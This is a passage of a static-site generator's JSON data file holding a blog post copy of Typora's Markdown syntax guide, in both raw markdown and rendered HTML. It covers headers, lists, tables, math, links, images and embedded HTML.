asterisks\\*\n```\n\nTypora recommends using the `*` symbol.\n\n### Strong\n\nA double `*` or `_` will cause its enclosed contents to be wrapped with an HTML `<strong>` tag, e.g:\n\n``` markdown\n**double asterisks**\n\n__double underscores__\n```\n\noutput:\n\n**double asterisks**\n\n__double underscores__\n\nTypora recommends using the `**` symbol.\n\n### Code\n\nTo indicate an inline span of code, wrap it with backtick quotes (`). Unlike a pre-formatted code block, a code span indicates code within a normal paragraph. For example:\n\n``` markdown\nUse the `printf()` function.\n```\n\nwill produce:\n\nUse the `printf()` function.\n\n### Strikethrough\n\nGFM adds syntax to create strikethrough text, which is missing from standard Markdown.\n\n`~~Mistaken text.~~` becomes ~~Mistaken text.~~\n\n### Underlines\n\nUnderline is powered by raw HTML.\n\n`<u>Underline</u>` becomes <u>Underline</u>.\n\n### Emoji :smile:\n\nInput emoji with syntax `:smile:`.\n\nUser can trigger auto-complete suggestions for emoji by pressing `ESC` key, or trigger it automatically after enabling it on preference panel. Also, inputting UTF-8 emoji characters directly is also supported by going to `Edit` -> `Emoji & Symbols` in the menu bar (macOS).\n\n### Inline Math\n\nTo use this feature, please enable it first in the `Preference` Panel -> `Markdown` Tab. Then, use `$` to wrap a TeX command. For example: `$\\lim_{x \\to \\infty} \\exp(-x) = 0$` will be rendered as LaTeX command.\n\nTo trigger inline preview for inline math: input “$”, then press the `ESC` key, then input a TeX command.\n\nYou can find more details [here](https://support.typora.io/Math/).\n\n### Subscript\n\nTo use this feature, please enable it first in the `Preference` Panel -> `Markdown` Tab. Then, use `~` to wrap subscript content. For example: `H~2~O`, `X~long\\ text~`/\n\n### Superscript\n\nTo use this feature, please enable it first in the `Preference` Panel -> `Markdown` Tab. Then, use `^` to wrap superscript content. For example: `X^2^`.\n\n### Highlight\n\nTo use this feature, please enable it first in the `Preference` Panel -> `Markdown` Tab. Then, use `==` to wrap highlight content. For example: `==highlight==`.\n\n## HTML\n\nYou can use HTML to style content what pure Markdown does not support. For example, use `<span style=\"color:red\">this text is red</span>` to add text with red color.\n\n### Embed Contents\n\nSome websites provide iframe-based embed code which you can also paste into Typora. For example:\n\n```Markdown\n<iframe height='265' scrolling='no' title='Fancy Animated SVG Menu' src='http://codepen.io/jeangontijo/embed/OxVywj/?height=265&theme-id=0&default-tab=css,result&embed-version=2' frameborder='no' allowtransparency='true' allowfullscreen='true' style='width: 100%;'></iframe>\n```\n\n### Video\n\nYou can use the `<video>` HTML tag to embed videos. For example:\n\n```Markdown\n<video src=\"xxx.mp4\" />\n```\n\n### Other HTML Support\n\nYou can find more details [here](https://support.typora.io/HTML/).\n\n[GFM]: https://help.github.com/articles/github-flavored-markdown/","slug":"Markdown_Typora","published":1,"updated":"2021-03-24T04:15:01.447Z","layout":"post","photos":[],"link":"","_id":"ckq3bl420000adsvt32sd8uav","content":"<h1 id=\"Markdown-For-Typora\"><a href=\"#Markdown-For-Typora\" class=\"headerlink\" title=\"Markdown For Typora\"></a>Markdown For Typora</h1><h2 id=\"Overview\"><a href=\"#Overview\" class=\"headerlink\" title=\"Overview\"></a>Overview</h2><p><strong>Markdown</strong> is created by <a href=\"http://daringfireball.net/\">Daring Fireball</a>; the original guideline is <a href=\"http://daringfireball.net/projects/markdown/syntax\">here</a>. Its syntax, however, varies between different parsers or editors. <strong>Typora</strong> is using <a href=\"https://help.github.com/articles/github-flavored-markdown/\">GitHub Flavored Markdown</a>.</p>\n<span id=\"more\"></span>\n\n<p>[toc]</p>\n<h2 id=\"Block-Elements\"><a href=\"#Block-Elements\" class=\"headerlink\" title=\"Block Elements\"></a>Block Elements</h2><h3 id=\"Paragraph-and-line-breaks\"><a href=\"#Paragraph-and-line-breaks\" class=\"headerlink\" title=\"Paragraph and line breaks\"></a>Paragraph and line breaks</h3><p>A paragraph is simply one or more consecutive lines of text. In markdown source code, paragraphs are separated by two or more blank lines. In Typora, you only need one blank line (press <code>Return</code> once) to create a new paragraph.</p>\n<p>Press <code>Shift</code> + <code>Return</code> to create a single line break. Most other markdown parsers will ignore single line breaks, so in order to make other markdown parsers recognize your line break, you can leave two spaces at the end of the line, or insert <code>&lt;br/&gt;</code>.</p>\n<h3 id=\"Headers\"><a href=\"#Headers\" class=\"headerlink\" title=\"Headers\"></a>Headers</h3><p>Headers use 1-6 hash (<code>#</code>) characters at the start of the line, corresponding to header levels 1-6. For example:</p>\n<pre><code class=\"markdown\"># This is an H1\n\n## This is an H2\n\n###### This is an H6</code></pre>\n<p>In Typora, input ‘#’s followed by title content, and press <code>Return</code> key will create a header.</p>\n<h3 id=\"Blockquotes\"><a href=\"#Blockquotes\" class=\"headerlink\" title=\"Blockquotes\"></a>Blockquotes</h3><p>Markdown uses email-style &gt; characters for block quoting. They are presented as:</p>\n<pre><code class=\"markdown\">&gt; This is a blockquote with two paragraphs. This is first paragraph.\n&gt;\n&gt; This is second pragraph. Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.\n\n\n\n&gt; This is another blockquote with one paragraph. There is three empty line to seperate two blockquote.</code></pre>\n<p>In Typora, inputting ‘&gt;’ followed by your quote contents will generate a quote block. Typora will insert a proper ‘&gt;’ or line break for you. Nested block quotes (a block quote inside another block quote) by adding additional levels of ‘&gt;’.</p>\n<h3 id=\"Lists\"><a href=\"#Lists\" class=\"headerlink\" title=\"Lists\"></a>Lists</h3><p>Input <code>* list item 1</code> will create an unordered list - the <code>*</code> symbol can be replace with <code>+</code> or <code>-</code>.</p>\n<p>Input <code>1. list item 1</code> will create an ordered list - their markdown source code is as follows:</p>\n<pre><code class=\"markdown\">## un-ordered list\n*   Red\n*   Green\n*   Blue\n\n## ordered list\n1.  Red\n2.     Green\n3.    Blue</code></pre>\n<h3 id=\"Task-List\"><a href=\"#Task-List\" class=\"headerlink\" title=\"Task List\"></a>Task List</h3><p>Task lists are lists with items marked as either [ ] or [x] (incomplete or complete). For example:</p>\n<pre><code class=\"markdown\">- [ ] a task list item\n- [ ] list syntax required\n- [ ] normal **formatting**, @mentions, #1234 refs\n- [ ] incomplete\n- [x] completed</code></pre>\n<p>You can change the complete/incomplete state by clicking on the checkbox before the item.</p>\n<h3 id=\"Fenced-Code-Blocks\"><a href=\"#Fenced-Code-Blocks\" class=\"headerlink\" title=\"(Fenced) Code Blocks\"></a>(Fenced) Code Blocks</h3><p>Typora only supports fences in GitHub Flavored Markdown. Original code blocks in markdown are not supported.</p>\n<p>Using fences is easy: Input ``` and press <code>return</code>. Add an optional language identifier after ``` and we’ll run it through syntax highlighting:</p>\n<pre><code class=\"markdown\">Here&#39;s an example:\n\n​```\nfunction test() &#123;\n  console.log(&quot;notice the blank line before this function?&quot;);\n&#125;\n​```\n\nsyntax highlighting:\n​```ruby\nrequire &#39;redcarpet&#39;\nmarkdown = Redcarpet.new(&quot;Hello World!&quot;)\nputs markdown.to_html\n​```</code></pre>\n<h3 id=\"Math-Blocks\"><a href=\"#Math-Blocks\" class=\"headerlink\" title=\"Math Blocks\"></a>Math Blocks</h3><p>You can render <em>LaTeX</em> mathematical expressions using <strong>MathJax</strong>.</p>\n<p>To add a mathematical expression, input <code>$$</code> and press the ‘Return’ key. This will trigger an input field which accepts <em>Tex/LaTex</em> source. For example:</p>\n<p>$$<br>\\mathbf{V}_1 \\times \\mathbf{V}_2 =  \\begin{vmatrix}<br>\\mathbf{i} &amp; \\mathbf{j} &amp; \\mathbf{k} \\<br>\\frac{\\partial X}{\\partial u} &amp;  \\frac{\\partial Y}{\\partial u} &amp; 0 \\<br>\\frac{\\partial X}{\\partial v} &amp;  \\frac{\\partial Y}{\\partial v} &amp; 0 \\<br>\\end{vmatrix}<br>$$</p>\n<p>In the markdown source file, the math block is a <em>LaTeX</em> expression wrapped by a pair of ‘$$’ marks:</p>\n<pre><code class=\"markdown\">$$\n\\mathbf&#123;V&#125;_1 \\times \\mathbf&#123;V&#125;_2 =  \\begin&#123;vmatrix&#125;\n\\mathbf&#123;i&#125; &amp; \\mathbf&#123;j&#125; &amp; \\mathbf&#123;k&#125; \\\\\n\\frac&#123;\\partial X&#125;&#123;\\partial u&#125; &amp;  \\frac&#123;\\partial Y&#125;&#123;\\partial u&#125; &amp; 0 \\\\\n\\frac&#123;\\partial X&#125;&#123;\\partial v&#125; &amp;  \\frac&#123;\\partial Y&#125;&#123;\\partial v&#125; &amp; 0 \\\\\n\\end&#123;vmatrix&#125;\n$$</code></pre>\n<p>You can find more details <a href=\"https://support.typora.io/Math/\">here</a>.</p>\n<h3 id=\"Tables\"><a href=\"#Tables\" class=\"headerlink\" title=\"Tables\"></a>Tables</h3><p>Input <code>| First Header  | Second Header |</code> and press the <code>return</code> key. This will create a table with two columns.</p>\n<p>After a table is created, putting focus on that table will open up a toolbar for the table where you can resize, align, or delete the table. You can also use the context menu to copy and add/delete individual columns/rows.</p>\n<p>The full syntax for tables is described below, but it is not necessary to know the full syntax in detail as the markdown source code for tables is generated automatically by Typora.</p>\n<p>In markdown source code, they look like:</p>\n<pre><code class=\"markdown\">| First Header  | Second Header |\n| ------------- | ------------- |\n| Content Cell  | Content Cell  |\n| Content Cell  | Content Cell  |</code></pre>\n<p>You can also include inline Markdown such as links, bold, italics, or strikethrough in the table.</p>\n<p>Finally, by including colons (<code>:</code>) within the header row, you can define text in that column to be left-aligned, right-aligned, or center-aligned:</p>\n<pre><code class=\"markdown\">| Left-Aligned  | Center Aligned  | Right Aligned |\n| :------------ |:---------------:| -----:|\n| col 3 is      | some wordy text | $1600 |\n| col 2 is      | centered        |   $12 |\n| zebra stripes | are neat        |    $1 |</code></pre>\n<p>A colon on the left-most side indicates a left-aligned column; a colon on the right-most side indicates a right-aligned column; a colon on both sides indicates a center-aligned column.</p>\n<h3 id=\"Footnotes\"><a href=\"#Footnotes\" class=\"headerlink\" title=\"Footnotes\"></a>Footnotes</h3><pre><code class=\"markdown\">You can create footnotes like this[^footnote].\n\n[^footnote]: Here is the *text* of the **footnote**.</code></pre>\n<p>will produce:</p>\n<p>You can create footnotes like this[^footnote].</p>\n<p>[^footnote]: Here is the <em>text</em> of the <strong>footnote</strong>.</p>\n<p>Hover over the ‘footnote’ superscript to see content of the footnote.</p>\n<h3 id=\"Horizontal-Rules\"><a href=\"#Horizontal-Rules\" class=\"headerlink\" title=\"Horizontal Rules\"></a>Horizontal Rules</h3><p>Inputting <code>***</code> or <code>---</code> on a blank line and pressing <code>return</code> will draw a horizontal line.</p>\n<hr>\n<h3 id=\"YAML-Front-Matter\"><a href=\"#YAML-Front-Matter\" class=\"headerlink\" title=\"YAML Front Matter\"></a>YAML Front Matter</h3><p>Typora now supports <a href=\"http://jekyllrb.com/docs/frontmatter/\">YAML Front Matter</a>. Input <code>---</code> at the top of the article and then press <code>Return</code> to introduce a metadata block. Alternatively, you can insert a metadata block from the top menu of Typora.</p>\n<h3 id=\"Table-of-Contents-TOC\"><a href=\"#Table-of-Contents-TOC\" class=\"headerlink\" title=\"Table of Contents (TOC)\"></a>Table of Contents (TOC)</h3><p>Input <code>[toc]</code> and press the <code>Return</code> key. This will create a  “Table of Contents” section. The TOC extracts all headers from the document, and its contents are updated automatically as you add to the document.</p>\n<h2 id=\"Span-Elements\"><a href=\"#Span-Elements\" class=\"headerlink\" title=\"Span Elements\"></a>Span Elements</h2><p>Span elements will be parsed and rendered right after typing. Moving the cursor in middle of those span elements will expand those elements into markdown source. Below is an explanation of the syntax for each span element.</p>\n<h3 id=\"Links\"><a href=\"#Links\" class=\"headerlink\" title=\"Links\"></a>Links</h3><p>Markdown supports two styles of links: inline and reference.</p>\n<p>In both styles, the link text is delimited by [square brackets].</p>\n<p>To create an inline link, use a set of regular parentheses immediately after the link text’s closing square bracket. Inside the parentheses, put the URL where you want the link to point, along with an optional title for the link, surrounded in quotes. For example:</p>\n<pre><code class=\"markdown\">This is [an example](http://example.com/ &quot;Title&quot;) inline link.\n\n[This link](http://example.net/) has no title attribute.</code></pre>\n<p>will produce:</p>\n<p>This is <a href=\"http://example.com/\" title=\"Title\">an example</a> inline link. (<code>&lt;p&gt;This is &lt;a href=&quot;http://example.com/&quot; title=&quot;Title&quot;&gt;</code>)</p>\n<p><a href=\"http://example.net/\">This link</a> has no title attribute. (<code>&lt;p&gt;&lt;a href=&quot;http://example.net/&quot;&gt;This link&lt;/a&gt; has no</code>)</p>\n<h4 id=\"Internal-Links\"><a href=\"#Internal-Links\" class=\"headerlink\" title=\"Internal Links\"></a>Internal Links</h4><p><strong>You can set the href to headers</strong>, which will create a bookmark that allow you to jump to that section after clicking. For example:</p>\n<p>Command(on Windows: Ctrl) + Click <a href=\"#block-elements\">This link</a> will jump to header <code>Block Elements</code>. To see how to write that, please move cursor or click that link with <code>⌘</code> key pressed to expand the element into markdown source.</p>\n<h4 id=\"Reference-Links\"><a href=\"#Reference-Links\" class=\"headerlink\" title=\"Reference Links\"></a>Reference Links</h4><p>Reference-style links use a second set of square brackets, inside which you place a label of your choosing to identify the link:</p>\n<pre><code class=\"markdown\">This is [an example][id] reference-style link.\n\nThen, anywhere in the document, you define your link label on a line by itself like this:\n\n[id]: http://example.com/  &quot;Optional Title Here&quot;</code></pre>\n<p>In Typora, they will be rendered like so:</p>\n<p>This is <a href=\"http://example.com/\" title=\"Optional Title Here\">an example</a> reference-style link.</p>\n<p>The implicit link name shortcut allows you to omit the name of the link, in which case the link text itself is used as the name. Just use an empty set of square brackets — for example, to link the word “Google” to the google.com web site, you could simply write:</p>\n<pre><code class=\"markdown\">[Google][]\nAnd then define the link:\n\n[Google]: http://google.com/</code></pre>\n<p>In Typora, clicking the link will expand it for editing, and command+click will open the hyperlink in your web browser.</p>\n<h3 id=\"URLs\"><a href=\"#URLs\" class=\"headerlink\" title=\"URLs\"></a>URLs</h3><p>Typora allows you to insert URLs as links, wrapped by <code>&lt;</code>brackets<code>&gt;</code>.</p>\n<p><code>&lt;i@typora.io&gt;</code> becomes <a href=\"mailto:&#105;&#x40;&#x74;&#x79;&#x70;&#111;&#x72;&#x61;&#46;&#105;&#111;\">&#105;&#x40;&#x74;&#x79;&#x70;&#111;&#x72;&#x61;&#46;&#105;&#111;</a>.</p>\n<p>Typora will also automatically link standard URLs. e.g: <a href=\"http://www.google.com\">www.google.com</a>.</p>\n<h3 id=\"Images\"><a href=\"#Images\" class=\"headerlink\" title=\"Images\"></a>Images</h3><p>Images have similar syntax as links, but they require an additional <code>!</code> char before the start of the link. The syntax for inserting an image looks like this:</p>\n<pre><code class=\"markdown\">![Alt text](/path/to/img.jpg)\n\n![Alt text](/path/to/img.jpg &quot;Optional title&quot;)</code></pre>\n<p>You are able to use drag &amp; drop to insert an image from an image file or your web browser. You can modify the markdown source code by clicking on the image. A relative path will be used if the image that is added using drag &amp; drop is in same directory or sub-directory as the document you’re currently editing.</p>\n<p>If you’re using markdown for building websites, you may specify a URL prefix for the image preview on your local computer with property <code>typora-root-url</code> in YAML Front Matters. For example, input <code>typora-root-url:/User/Abner/Website/typora.io/</code> in YAML Front Matters, and then <code>![alt](/blog/img/test.png)</code> will be treated as <code>![alt](file:///User/Abner/Website/typora.io/blog/img/test.png)</code> in Typora.</p>\n<p>You can find more details <a href=\"https://support.typora.io/Images/\">here</a>.</p>\n<h3 id=\"Emphasis\"><a href=\"#Emphasis\" class=\"headerlink\" title=\"Emphasis\"></a>Emphasis</h3><p>Markdown treats asterisks (<code>*</code>) and underscores (<code>_</code>) as indicators of emphasis. Text wrapped with one <code>*</code> or <code>_</code> will be wrapped with an HTML <code>&lt;em&gt;</code> tag. E.g:</p>\n<pre><code class=\"markdown\">*single asterisks*\n\n_single underscores_</code></pre>\n<p>output:</p>\n<p><em>single asterisks</em></p>\n<p><em>single underscores</em></p>\n<p>GFM will ignore underscores in words, which is commonly used in code and names, like this:</p>\n<blockquote>\n<p>wow_great_stuff</p>\n<p>do_this_and_do_that_and_another_thing.</p>\n</blockquote>\n<p>To produce a literal asterisk or underscore at a position where it would otherwise be used as an emphasis delimiter, you can backslash escape it:</p>\n<pre><code class=\"markdown\">\\*this text is surrounded by literal asterisks\\*</code></pre>\n<p>Typora recommends using the <code>*</code> symbol.</p>\n<h3 id=\"Strong\"><a href=\"#Strong\" class=\"headerlink\" title=\"Strong\"></a>Strong</h3><p>A double <code>*</code> or <code>_</code> will cause its enclosed contents to be wrapped with an HTML <code>&lt;strong&gt;</code> tag, e.g:</p>\n<pre><code class=\"markdown\">**double asterisks**\n\n__double underscores__</code></pre>\n<p>output:</p>\n<p><strong>double asterisks</strong></p>\n<p><strong>double underscores</strong></p>\n<p>Typora recommends using the <code>**</code> symbol.</p>\n<h3 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h3><p>To indicate an inline span of code, wrap it with backtick quotes (`). Unlike a pre-formatted code block, a code span indicates code within a normal paragraph. For example:</p>\n<pre><code class=\"markdown\">Use the `printf()` function.</code></pre>\n<p>will produce:</p>\n<p>Use the <code>printf()</code> function.</p>\n<h3 id=\"Strikethrough\"><a href=\"#Strikethrough\" class=\"headerlink\" title=\"Strikethrough\"></a>Strikethrough</h3><p>GFM adds syntax to create strikethrough text, which is missing from standard Markdown.</p>\n<p><code>~~Mistaken text.~~</code> becomes <del>Mistaken text.</del></p>\n<h3 id=\"Underlines\"><a href=\"#Underlines\" class=\"headerlink\" title=\"Underlines\"></a>Underlines</h3><p>Underline is powered by raw HTML.</p>\n<p><code>&lt;u&gt;Underline&lt;/u&gt;</code> becomes <u>Underline</u>.</p>\n<h3 id=\"Emoji-smile\"><a href=\"#Emoji-smile\" class=\"headerlink\" title=\"Emoji :smile:\"></a>Emoji :smile:</h3><p>Input emoji with syntax <code>:smile:</code>.</p>\n<p>User can trigger auto-complete suggestions for emoji by pressing <code>ESC</code> key, or trigger it automatically after enabling it on preference panel. Also, inputting UTF-8 emoji characters directly is also supported by going to <code>Edit</code> -&gt; <code>Emoji &amp; Symbols</code> in the menu bar (macOS).</p>\n<h3 id=\"Inline-Math\"><a href=\"#Inline-Math\" class=\"headerlink\" title=\"Inline Math\"></a>Inline Math</h3><p>To use this feature, please enable it first in the <code>Preference</code> Panel -&gt; <code>Markdown</code> Tab. Then, use <code>$</code> to wrap a TeX command. For example: <code>$\\lim_&#123;x \\to \\infty&#125; \\exp(-x) = 0$</code> will be rendered as LaTeX command.</p>\n<p>To trigger inline preview for inline math: input “$”, then press the <code>ESC</code> key, then input a TeX command.</p>\n<p>You can find more details <a href=\"https://support.typora.io/Math/\">here</a>.</p>\n<h3 id=\"Subscript\"><a href=\"#Subscript\" class=\"headerlink\" title=\"Subscript\"></a>Subscript</h3><p>To use this feature, please enable it first in the <code>Preference</code> Panel -&gt; <code>Markdown</code> Tab. Then, use <code>~</code> to wrap subscript content. For example: <code>H~2~O</code>, <code>X~long\\ text~</code>/</p>\n<h3 id=\"Superscript\"><a href=\"#Superscript\" class=\"headerlink\" title=\"Superscript\"></a>Superscript</h3><p>To use this feature, please enable it first in the <code>Preference</code> Panel -&gt; <code>Markdown</code> Tab. Then, use <code>^</code> to wrap superscript content. For example: <code>X^2^</code>.</p>\n<h3 id=\"Highlight\"><a href=\"#Highlight\" class=\"headerlink\" title=\"Highlight\"></a>Highlight</h3><p>To use this feature, please enable it first in the <code>Preference</code> Panel -&gt; <code>Markdown</code> Tab. Then, use <code>==</code> to wrap highlight content. For example: <code>==highlight==</code>.</p>\n<h2 id=\"HTML\"><a href=\"#HTML\" class=\"headerlink\" title=\"HTML\"></a>HTML</h2><p>You can use HTML to style content what pure Markdown does not support. For example, use <code>&lt;span style=&quot;color:red&quot;&gt;this text is red&lt;/span&gt;</code> to add text with red color.</p>\n<h3 id=\"Embed-Contents\"><a href=\"#Embed-Contents\" class=\"headerlink\" title=\"Embed Contents\"></a>Embed Contents</h3><p>Some websites provide iframe-based embed code which you can also paste into Typora. For example:</p>\n<pre><code class=\"Markdown\">&lt;iframe height=&#39;265&#39; scrolling=&#39;no&#39; title=&#39;Fancy Animated SVG Menu&#39; src=&#39;http://codepen.io/jeangontijo/embed/OxVywj/?height=265&amp;theme-id=0&amp;default-tab=css,result&amp;embed-version=2&#39; frameborder=&#39;no&#39; allowtransparency=&#39;true&#39; allowfullscreen=&#39;true&#39; style=&#39;width: 100%;&#39;&gt;&lt;/iframe&gt;</code></pre>\n<h3 id=\"Video\"><a href=\"#Video\" class=\"headerlink\" title=\"Video\"></a>Video</h3><p>You can use the <code>&lt;video&gt;</code> HTML tag to embed videos. For example:</p>\n<pre><code class=\"Markdown\">&lt;video src=&quot;xxx.mp4&quot; /&gt;</code></pre>\n<h3 id=\"Other-HTML-Support\"><a href=\"#Other-HTML-Support\" class=\"headerlink\" title=\"Other HTML Support\"></a>Other HTML Support</h3><p>You can find more details <a href=\"https://support.typora.io/HTML/\">here</a>.</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"Markdown-For-Typora\"><a href=\"#Markdown-For-Typora\" class=\"headerlink\" title=\"Markdown For Typora\"></a>Markdown For Typora</h1><h2 id=\"Overview\"><a href=\"#Overview\" class=\"headerlink\" title=\"Overview\"></a>Overview</h2><p><strong>Markdown</strong> is created by <a href=\"http://daringfireball.net/\">Daring Fireball</a>; the original guideline is <a href=\"http://daringfireball.net/projects/markdown/syntax\">here</a>. Its syntax, however, varies between different parsers or editors. <strong>Typora</strong> is using <a href=\"https://help.github.com/articles/github-flavored-markdown/\">GitHub Flavored Markdown</a>.</p>","more":"<p>[toc]</p>\n<h2 id=\"Block-Elements\"><a href=\"#Block-Elements\" class=\"headerlink\" title=\"Block Elements\"></a>Block Elements</h2><h3 id=\"Paragraph-and-line-breaks\"><a href=\"#Paragraph-and-line-breaks\" class=\"headerlink\" title=\"Paragraph and line breaks\"></a>Paragraph and line breaks</h3><p>A paragraph is simply one or more consecutive lines of text. In markdown source code, paragraphs are separated by two or more blank lines. In Typora, you only need one blank line (press <code>Return</code> once) to create a new paragraph.</p>\n<p>Press <code>Shift</code> + <code>Return</code> to create a single line break. Most other markdown parsers will ignore single line breaks, so in order to make other markdown parsers recognize your line break, you can leave two spaces at the end of the line, or insert <code>&lt;br/&gt;</code>.</p>\n<h3 id=\"Headers\"><a href=\"#Headers\" class=\"headerlink\" title=\"Headers\"></a>Headers</h3><p>Headers use 1-6 hash (<code>#</code>) characters at the start of the line, corresponding to header levels 1-6. For example:</p>\n<pre><code class=\"markdown\"># This is an H1\n\n## This is an H2\n\n###### This is an H6</code></pre>\n<p>In Typora, input ‘#’s followed by title content, and press <code>Return</code> key will create a header.</p>\n<h3 id=\"Blockquotes\"><a href=\"#Blockquotes\" class=\"headerlink\" title=\"Blockquotes\"></a>Blockquotes</h3><p>Markdown uses email-style &gt; characters for block quoting. They are presented as:</p>\n<pre><code class=\"markdown\">&gt; This is a blockquote with two paragraphs. This is first paragraph.\n&gt;\n&gt; This is second pragraph. Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.\n\n\n\n&gt; This is another blockquote with one paragraph. There is three empty line to seperate two blockquote.</code></pre>\n<p>In Typora, inputting ‘&gt;’ followed by your quote contents will generate a quote block. Typora will insert a proper ‘&gt;’ or line break for you. Nested block quotes (a block quote inside another block quote) by adding additional levels of ‘&gt;’.</p>\n<h3 id=\"Lists\"><a href=\"#Lists\" class=\"headerlink\" title=\"Lists\"></a>Lists</h3><p>Input <code>* list item 1</code> will create an unordered list - the <code>*</code> symbol can be replace with <code>+</code> or <code>-</code>.</p>\n<p>Input <code>1. list item 1</code> will create an ordered list - their markdown source code is as follows:</p>\n<pre><code class=\"markdown\">## un-ordered list\n*   Red\n*   Green\n*   Blue\n\n## ordered list\n1.  Red\n2.     Green\n3.    Blue</code></pre>\n<h3 id=\"Task-List\"><a href=\"#Task-List\" class=\"headerlink\" title=\"Task List\"></a>Task List</h3><p>Task lists are lists with items marked as either [ ] or [x] (incomplete or complete). For example:</p>\n<pre><code class=\"markdown\">- [ ] a task list item\n- [ ] list syntax required\n- [ ] normal **formatting**, @mentions, #1234 refs\n- [ ] incomplete\n- [x] completed</code></pre>\n<p>You can change the complete/incomplete state by clicking on the checkbox before the item.</p>\n<h3 id=\"Fenced-Code-Blocks\"><a href=\"#Fenced-Code-Blocks\" class=\"headerlink\" title=\"(Fenced) Code Blocks\"></a>(Fenced) Code Blocks</h3><p>Typora only supports fences in GitHub Flavored Markdown. Original code blocks in markdown are not supported.</p>\n<p>Using fences is easy: Input ``` and press <code>return</code>. Add an optional language identifier after ``` and we’ll run it through syntax highlighting:</p>\n<pre><code class=\"markdown\">Here&#39;s an example:\n\n​```\nfunction test() &#123;\n  console.log(&quot;notice the blank line before this function?&quot;);\n&#125;\n​```\n\nsyntax highlighting:\n​```ruby\nrequire &#39;redcarpet&#39;\nmarkdown = Redcarpet.new(&quot;Hello World!&quot;)\nputs markdown.to_html\n​```</code></pre>\n<h3 id=\"Math-Blocks\"><a href=\"#Math-Blocks\" class=\"headerlink\" title=\"Math Blocks\"></a>Math Blocks</h3><p>You can render <em>LaTeX</em> mathematical expressions using <strong>MathJax</strong>.</p>\n<p>To add a mathematical expression, input <code>$$</code> and press the ‘Return’ key. This will trigger an input field which accepts <em>Tex/LaTex</em> source. For example:</p>\n<p>$$<br>\\mathbf{V}_1 \\times \\mathbf{V}_2 =  \\begin{vmatrix}<br>\\mathbf{i} &amp; \\mathbf{j} &amp; \\mathbf{k} \\<br>\\frac{\\partial X}{\\partial u} &amp;  \\frac{\\partial Y}{\\partial u} &amp; 0 \\<br>\\frac{\\partial X}{\\partial v} &amp;  \\frac{\\partial Y}{\\partial v} &amp; 0 \\<br>\\end{vmatrix}<br>$$</p>\n<p>In the markdown source file, the math block is a <em>LaTeX</em> expression wrapped by a pair of ‘$$’ marks:</p>\n<pre><code class=\"markdown\">$$\n\\mathbf&#123;V&#125;_1 \\times \\mathbf&#123;V&#125;_2 =  \\begin&#123;vmatrix&#125;\n\\mathbf&#123;i&#125; &amp; \\mathbf&#123;j&#125; &amp; \\mathbf&#123;k&#125; \\\\\n\\frac&#123;\\partial X&#125;&#123;\\partial u&#125; &amp;  \\frac&#123;\\partial Y&#125;&#123;\\partial u&#125; &amp; 0 \\\\\n\\frac&#123;\\partial X&#125;&#123;\\partial v&#125; &amp;  \\frac&#123;\\partial Y&#125;&#123;\\partial v&#125; &amp; 0 \\\\\n\\end&#123;vmatrix&#125;\n$$</code></pre>\n<p>You can find more details <a href=\"https://support.typora.io/Math/\">here</a>.</p>\n<h3 id=\"Tables\"><a href=\"#Tables\" class=\"headerlink\" title=\"Tables\"></a>Tables</h3><p>Input <code>| First Header  | Second Header |</code> and press the <code>return</code> key. This will create a table with two columns.</p>\n<p>After a table is created, putting focus on that table will open up a toolbar for the table where you can resize, align, or delete the table. You can also use the context menu to copy and add/delete individual columns/rows.</p>\n<p>The full syntax for tables is described below, but it is not necessary to know the full syntax in detail as the markdown source code for tables is generated automatically by Typora.</p>\n<p>In markdown source code, they look like:</p>\n<pre><code class=\"markdown\">| First Header  | Second Header |\n| ------------- | ------------- |\n| Content Cell  | Content Cell  |\n| Content Cell  | Content Cell  |</code></pre>\n<p>You can also include inline Markdown such as links, bold, italics, or strikethrough in the table.</p>\n<p>Finally, by including colons (<code>:</code>) within the header row, you can define text in that column to be left-aligned, right-aligned, or center-aligned:</p>\n<pre><code class=\"markdown\">| Left-Aligned  | Center Aligned  | Right Aligned |\n| :------------ |:---------------:| -----:|\n| col 3 is      | some wordy text | $1600 |\n| col 2 is      | centered        |   $12 |\n| zebra stripes | are neat        |    $1 |</code></pre>\n<p>A colon on the left-most side indicates a left-aligned column; a colon on the right-most side indicates a right-aligned column; a colon on both sides indicates a center-aligned column.</p>\n<h3 id=\"Footnotes\"><a href=\"#Footnotes\" class=\"headerlink\" title=\"Footnotes\"></a>Footnotes</h3><pre><code class=\"markdown\">You can create footnotes like this[^footnote].\n\n[^footnote]: Here is the *text* of the **footnote**.</code></pre>\n<p>will produce:</p>\n<p>You can create footnotes like this[^footnote].</p>\n<p>[^footnote]: Here is the <em>text</em> of the <strong>footnote</strong>.</p>\n<p>Hover over the ‘footnote’ superscript to see content of the footnote.</p>\n<h3 id=\"Horizontal-Rules\"><a href=\"#Horizontal-Rules\" class=\"headerlink\" title=\"Horizontal Rules\"></a>Horizontal Rules</h3><p>Inputting <code>***</code> or <code>---</code> on a blank line and pressing <code>return</code> will draw a horizontal line.</p>\n<hr>\n<h3 id=\"YAML-Front-Matter\"><a href=\"#YAML-Front-Matter\" class=\"headerlink\" title=\"YAML Front Matter\"></a>YAML Front Matter</h3><p>Typora now supports <a href=\"http://jekyllrb.com/docs/frontmatter/\">YAML Front Matter</a>. Input <code>---</code> at the top of the article and then press <code>Return</code> to introduce a metadata block. Alternatively, you can insert a metadata block from the top menu of Typora.</p>\n<h3 id=\"Table-of-Contents-TOC\"><a href=\"#Table-of-Contents-TOC\" class=\"headerlink\" title=\"Table of Contents (TOC)\"></a>Table of Contents (TOC)</h3><p>Input <code>[toc]</code> and press the <code>Return</code> key. This will create a  “Table of Contents” section. The TOC extracts all headers from the document, and its contents are updated automatically as you add to the document.</p>\n<h2 id=\"Span-Elements\"><a href=\"#Span-Elements\" class=\"headerlink\" title=\"Span Elements\"></a>Span Elements</h2><p>Span elements will be parsed and rendered right after typing. Moving the cursor in middle of those span elements will expand those elements into markdown source. Below is an explanation of the syntax for each span element.</p>\n<h3 id=\"Links\"><a href=\"#Links\" class=\"headerlink\" title=\"Links\"></a>Links</h3><p>Markdown supports two styles of links: inline and reference.</p>\n<p>In both styles, the link text is delimited by [square brackets].</p>\n<p>To create an inline link, use a set of regular parentheses immediately after the link text’s closing square bracket. Inside the parentheses, put the URL where you want the link to point, along with an optional title for the link, surrounded in quotes. For example:</p>\n<pre><code class=\"markdown\">This is [an example](http://example.com/ &quot;Title&quot;) 